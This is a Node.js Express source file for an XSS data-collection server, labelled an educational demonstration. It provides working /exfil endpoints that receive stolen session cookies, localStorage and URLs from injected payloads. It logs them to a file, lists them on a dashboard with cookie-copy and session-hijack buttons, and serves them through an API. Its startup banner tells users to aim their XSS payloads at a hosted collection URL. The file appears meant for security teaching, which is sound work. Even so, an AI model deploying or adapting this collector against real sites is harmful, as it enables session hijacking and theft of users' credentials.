const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;  // Different port from vulnerable app

// Store exfiltrated data in memory (for educational purposes)
const exfiltratedData = [];

app.use(express.json({ limit: '10mb' }));

// ===== EXFILTRATION ENDPOINT =====
// This simulates data collection for educational demonstration

app.get('/exfil', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = {
    timestamp,
    method: 'GET',
    query: req.query,
    headers: {
      'user-agent': req.headers['user-agent'],
      'referer': req.headers['referer'],
      'origin': req.headers['origin']
    },
    ip: req.ip
  };
  
  exfiltratedData.push(data);
  
  // Log to console
  console.log('\n🚨 DATA RECEIVED (GET):');
  console.log('Time:', timestamp);
  console.log('Data:', req.query);
  console.log('Referer:', req.headers['referer']);
  
  // Log to file
  fs.appendFileSync('exfiltration.log', 
    `\n[${timestamp}] GET - ${JSON.stringify(data, null, 2)}\n` + 
    '='.repeat(80) + '\n'
  );
  
  // Return 1x1 transparent pixel (so the img tag doesn't show broken image)
  res.set('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

app.post('/exfil', (req, res) => {
  const timestamp = new Date().toISOString();
  const data = {
    timestamp,
    method: 'POST',
    body: req.body,
    headers: {
      'user-agent': req.headers['user-agent'],
      'referer': req.headers['referer'],
      'origin': req.headers['origin']
    },
    ip: req.ip
  };
  
  exfiltratedData.push(data);
  
  // Log to console with colors
  console.log('\n🚨 DATA RECEIVED (POST):');
  console.log('Time:', timestamp);
  console.log('Cookie:', req.body.cookie);
  console.log('LocalStorage:', req.body.localStorage);
  console.log('URL:', req.body.url);
  console.log('Referer:', req.headers['referer']);
  
  // Log to file
  fs.appendFileSync('exfiltration.log', 
    `\n[${timestamp}] POST - ${JSON.stringify(data, null, 2)}\n` + 
    '='.repeat(80) + '\n'
  );
  
  res.json({ success: true, message: 'Data received' });
});

// ===== HELPER FUNCTION =====
// Generate HTML for stolen data items
function generateDataItemsHTML() {
  if (exfiltratedData.length === 0) {
    return '<p class="text-center text-white">No data captured yet. Waiting for demonstration...</p>';
  }
  
  return exfiltratedData.slice().reverse().map((item, index) => {
    const actualIndex = exfiltratedData.length - index - 1;
    const hasCookie = item.body?.cookie || item.query?.data;
    const hasLocalStorage = item.body?.localStorage;
    const hasUrl = item.body?.url && !item.body?.cookie;
    const hasQueryParams = Object.keys(item.query || {}).length > 0;
    
    return `
      <div class="stolen-item">
        <div class="d-flex justify-content-between mb-2">
          <strong class="timestamp">⏰ ${item.timestamp}</strong>
          <span class="badge ${item.method === 'POST' ? 'method-post bg-primary' : 'method-get bg-info'}">${item.method}</span>
        </div>
        
        ${hasCookie ? `
          <div class="mb-2">
            <strong class="cookie">🍪 SESSION COOKIE:</strong>
            <pre class="mb-1" id="cookie-${actualIndex}">${item.body?.cookie || item.query?.data}</pre>
            <div class="mt-2">
              <button class="btn btn-sm btn-success" onclick="copyCookie(${actualIndex})">
                📋 Copy Cookie
              </button>
              <button class="btn btn-sm btn-danger" onclick="hijackSession(${actualIndex})">
                🎯 View Hijack Instructions
              </button>
            </div>
          </div>
        ` : ''}
        
        ${hasLocalStorage ? `
          <div class="mb-2">
            <strong class="text-warning">💾 LOCAL STORAGE:</strong>
            <pre class="mb-1">${item.body.localStorage}</pre>
          </div>
        ` : ''}
        
        ${hasUrl ? `
          <div class="mb-2">
            <strong class="url">🔗 SOURCE URL:</strong>
            <pre class="mb-1">${item.body.url}</pre>
          </div>
        ` : ''}
        
        ${hasQueryParams ? `
          <div class="mb-2">
            <strong class="text-info">📋 QUERY PARAMS:</strong>
            <pre class="mb-1">${JSON.stringify(item.query, null, 2)}</pre>
          </div>
        ` : ''}
        
        <div class="small text-white">
          <strong>🌐 Referer:</strong> ${item.headers.referer || 'N/A'}<br>
          <strong>🖥️ User-Agent:</strong> ${item.headers['user-agent'] || 'N/A'}<br>
          <strong>📍 IP:</strong> ${item.ip}
        </div>
      </div>
    `;
  }).join('');
}

// ===== HIJACK INSTRUCTIONS PAGE =====
// Serves static instruction page with URL parameters
app.get('/hijack-instructions', (req, res) => {
  // Read the static HTML file and send it directly
  // The client-side JavaScript will parse URL parameters
  const html = fs.readFileSync(path.join(__dirname, 'views', 'hijack-instructions.html'), 'utf-8');
  res.send(html);
});

// ===== DASHBOARD ENDPOINT =====
// Shows all stolen data in a web interface
app.get('/', (req, res) => {
  // Read HTML template
  let html = fs.readFileSync(path.join(__dirname, 'views', 'dashboard.html'), 'utf-8');
  
  // Replace placeholders with dynamic data
  const totalCount = exfiltratedData.length;
  const cookieCount = exfiltratedData.filter(d => d.query?.data || d.body?.cookie).length;
  const dataItemsHTML = generateDataItemsHTML();
  
  html = html.replace(/{{TOTAL_COUNT}}/g, totalCount);
  html = html.replace(/{{COOKIE_COUNT}}/g, cookieCount);
  html = html.replace(/{{DATA_ITEMS}}/g, dataItemsHTML);
  
  res.send(html);
});

// Clear all data endpoint
app.post('/clear', (req, res) => {
  exfiltratedData.length = 0;
  console.log('\n🗑️ All demonstration data cleared');
  res.json({ success: true });
});

// Get data as JSON (for API access)
app.get('/api/stolen', (req, res) => {
  res.json({ count: exfiltratedData.length, data: exfiltratedData });
});

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    �  XSS DEMONSTRATION SERVER - EDUCATIONAL USE ONLY  �     ║
║                                                                ║
║   Dashboard: https://project-1-17.eduhk.hk                    ║
║   Exfil Endpoint: https://project-1-17.eduhk.hk/exfil        ║
║   API: https://project-1-17.eduhk.hk/api/stolen              ║
║                                                                ║
║   📝 Logs saved to: exfiltration.log                          ║
║                                                                ║
║   ⚠️  EDUCATIONAL DEMO - This demonstrates XSS impact for      ║
║   cybersecurity education. Never use these techniques on       ║
║   systems without explicit authorization!                      ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝

🎯 Update your XSS payloads to use:
   https://project-1-17.eduhk.hk/exfil

📊 View demonstration dashboard:
   https://project-1-17.eduhk.hk

🔄 Dashboard auto-refreshes every 3 seconds
  `);
});

module.exports = app;
